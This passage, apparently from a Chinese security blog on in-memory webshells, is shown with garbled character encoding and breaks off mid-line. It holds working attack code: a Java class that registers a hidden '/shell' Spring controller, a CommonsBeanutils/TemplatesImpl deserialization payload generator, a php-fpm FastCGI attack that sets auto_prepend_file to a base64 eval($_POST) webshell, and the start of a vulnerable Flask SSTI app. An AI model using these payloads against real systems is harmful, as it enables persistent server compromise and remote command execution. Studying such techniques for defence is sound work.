<span class="number">47</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">31</span>, <span class="number">88</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            defineClass.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è·å¾—å½“å‰ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åå°„è·å–RequestMappingHandlerMappingçš„configå­—æ®µ</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);</span><br><span class="line">            <span class="comment">//é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰controllerä¸­å”¯ä¸€çš„Methodå¯¹è±¡</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è®¾ç½®è·¯ç”±çš„è¯·æ±‚æ–¹æ³•ä¸ºPOST</span></span><br><span class="line">            <span class="type">RequestMethod</span> <span class="variable">requestMethod</span> <span class="operator">=</span> RequestMethod.POST;</span><br><span class="line">            <span class="comment">//åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>).methods(requestMethod).options(config).build();</span><br><span class="line">            requestMappingHandlerMapping.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ç”Ÿæˆå­—èŠ‚ç å’Œç”Ÿæˆåºåˆ—åŒ–payloadçš„Testä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilController.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes).replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯æ‰§è¡Œç»“æœï¼Œä¼ å…¥payloadï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270e21ddac507cc0cc025.jpg" title="image-20230808011049632" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270e21ddac507cc0cc025.jpg" alt="image-20230808011049632"></a></p><p>ä¹‹åè¿›å…¥&#x2F;shellï¼ŒæˆåŠŸæ³¨å…¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270f31ddac507cc0ce8bc.jpg" title="image-20230808011106412" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270f31ddac507cc0ce8bc.jpg" alt="image-20230808011106412"></a></p><h2 id="PHP-å†…å­˜é©¬"><a href="#PHP-å†…å­˜é©¬" class="headerlink" title="PHP å†…å­˜é©¬"></a>PHP å†…å­˜é©¬</h2><h3 id="æ³¨å…¥æ–¹æ³•ï¼š"><a href="#æ³¨å…¥æ–¹æ³•ï¼š" class="headerlink" title="æ³¨å…¥æ–¹æ³•ï¼š"></a>æ³¨å…¥æ–¹æ³•ï¼š</h3><p>ç›®å‰PHPä»ç„¶æ˜¯éå¸¸ä¸»æµçš„æœåŠ¡ç«¯Webè¯­è¨€ï¼Œåªæ˜¯ç½‘ä¸Šå¾ˆå¤šæ–‡ç« è¿˜æ˜¯æ›´å…³æ³¨Javaå†…å­˜é©¬ï¼Œå¯¹PHPå†…å­˜é©¬çš„äº†è§£ä¼¼ä¹åªåœç•™åœ¨PHPä¸æ­»é©¬ã€‚è€ŒPHPä¸æ­»é©¬ä¸€èˆ¬å­˜åœ¨æ–‡ä»¶è½åœ°ä¸è¯´ï¼Œè¿˜éå¸¸å®¹æ˜“è¢«ç®¡ç†å‘˜å‘ç°ï¼Œå› æ­¤å®åœ¨æ— æ³•å°†å®ƒå®šä¹‰ä¸ºå†…å­˜é©¬ã€‚</p><p>é‚£æˆ‘ä»¬æ€æ ·åšä¸éœ€è¦è½åœ°PHPæ–‡ä»¶å°±å¯ä»¥å°†æˆ‘ä»¬çš„Webshellæ³¨å…¥è¿›æœåŠ¡å™¨å‘¢ï¼Ÿå…¶å®æ–¹æ³•å¾ˆç®€å•ï¼Œè¿˜è®°å¾—PHPæœ‰ä¸€ä¸ªé…ç½®å«åšauto_prepend_fileå—ï¼Ÿauto_prepend_fileé…ç½®æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶åã€‚å‡è®¾æ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªPHPç½‘ç«™çš„RCEæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹auto_prepend_fileçš„å€¼ä¸º<code>data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</code>ï¼Œæ¥ä¸‹æ¥å½“æˆ‘ä»¬æ¯æ¬¡è®¿é—®åˆ«çš„PHPæ–‡ä»¶æ—¶éƒ½ä¼šè‡ªåŠ¨è§£æ<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>ï¼Œç„¶åå°±æ˜¯ä¼ å…¥shellå‚æ•°è¿›è¡ŒRCEäº†ã€‚é‚£å‡å¦‚æˆ‘ä»¬æ²¡æœ‰RCEæ˜¯ä¸æ˜¯å°±ä¸è¡Œï¼Ÿå…¶å®ä¸ç„¶ï¼Œåœ¨æŸäº›æƒ…å†µå¯èƒ½æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªSSRFæˆ–è€…php-fpmæœªæˆæƒå°±å¯ä»¥å®ŒæˆPHPå†…å­˜é©¬çš„æ³¨å…¥ã€‚</p><p>è¦äº†è§£è¿™ç§æ³¨å…¥æ‰‹æ³•ï¼Œé¦–å…ˆå°±è¦äº†è§£php-fpmæ˜¯åšä»€ä¹ˆçš„ã€‚phpè§£é‡Šå™¨å’Œwebserverè¿›è¡Œé€šä¿¡æ—¶ä½¿ç”¨cgiåè®®ï¼Œä½†æ˜¯ç”±äºå…¶æ¯æ¬¡éƒ½è¦å¼€å…³è¿›ç¨‹ï¼Œéå¸¸æµªè´¹èµ„æºï¼Œäºæ˜¯å‡ºç°äº†fastcgiï¼Œåˆ©ç”¨ä¸€ä¸ªè¿›ç¨‹ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚è€Œphp-fpmï¼ˆphp-Fastcgi Process Managerï¼‰å°±æ˜¯fastcgiçš„å®ç°ï¼Œå¹¶æä¾›äº†è¿›ç¨‹ç®¡ç†çš„åŠŸèƒ½ã€‚</p><p>ä»¥ä¸‹æ˜¯å€Ÿç”¨åˆ«çš„å¸ˆå‚…çš„ä¸€å¼ å›¾ï¼š</p><p><a href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" title="image" class="gallery-item"><img src="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" alt="image"></a></p><p>å¯ä»¥çœ‹åˆ°Nginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™php-fpmï¼ŒFPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œç”¨æˆ·è®¿é—®<a href="http://127.0.0.1/index.php?a=1&b=2">http://127.0.0.1/index.php?a=1&b=2</a>ï¼Œå¦‚æœwebç›®å½•æ˜¯&#x2F;var&#x2F;www&#x2F;htmlï¼Œé‚£ä¹ˆNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ•°ç»„å…¶å®å°±æ˜¯PHPä¸­$_SERVERæ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯PHPé‡Œçš„ç¯å¢ƒå˜é‡ã€‚PHP-FPMæ‹¿åˆ°fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡ŒSCRIPT_FILENAMEçš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯&#x2F;var&#x2F;www&#x2F;html&#x2F;index.phpã€‚åœ¨PHP-FPMä¸­æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„ç¯å¢ƒå˜é‡ï¼ŒPHP_VALUEå’ŒPHP_ADMIN_VALUEã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼ŒPHP_VALUEå¯ä»¥è®¾ç½®æ¨¡å¼ä¸ºPHP_INI_USERå’ŒPHP_INI_ALLçš„é€‰é¡¹ï¼ŒPHP_ADMIN_VALUEå¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆdisable_functionsé™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ç›´æ¥ä¸ä¼šè¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰</p><p>php-fpmé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå‡è®¾æˆ‘ä»¬å¯ä»¥è·³è¿‡nginxç›´æ¥ä¸php-fpmè¿›è¡Œé€šä¿¡ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥ä¼ªé€ fastcgiåè®®æ•°æ®åŒ…ä»è€Œæ”¹å˜PHPé‡Œçš„é…ç½®é¡¹ï¼Œä¾‹å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„auto_prepend_fileã€‚</p><p>æ„é€ å¦‚ä¸‹ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?x=x&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?x=x&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = &quot;data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=&quot;&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€è‡ªå·±æ”¹æ”¹pç‰›çš„è„šæœ¬è¿è¡Œå°±æ³¨å…¥æˆåŠŸäº†ï¼š<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><h2 id="Python-Flask-å†…å­˜é©¬"><a href="#Python-Flask-å†…å­˜é©¬" class="headerlink" title="Python Flask å†…å­˜é©¬"></a>Python Flask å†…å­˜é©¬</h2><p>Flask&#x2F;jinja2 SSTIæ¼æ´è¿‡äºåŸºç¡€å°±ä¸å†ä»‹ç»äº†ï¼Œç›´æ¥ç»™å‡ºæ¼æ´ç¯å¢ƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    person = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = 